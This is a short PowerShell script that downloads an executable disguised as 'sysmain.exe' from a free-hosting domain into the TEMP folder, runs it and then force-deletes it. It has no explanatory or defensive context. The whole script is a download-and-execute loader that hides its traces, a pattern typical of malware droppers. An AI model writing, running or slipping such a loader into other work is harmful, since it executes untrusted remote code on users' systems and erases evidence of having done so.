try {
    $exe = "$env:TEMP\sysmain.exe"
    Invoke-WebRequest "https://rapidfire.infy.uk/sysmain.exe" -OutFile $exe

    # Start process and wait for it to finish
    $process = Start-Process -FilePath $exe -Wait -PassThru

    # Delete the file after it finishes running
    Remove-Item $exe -Force
} catch {
    Write-Host "❌ Failed to download, run, or delete the file: $_"
}

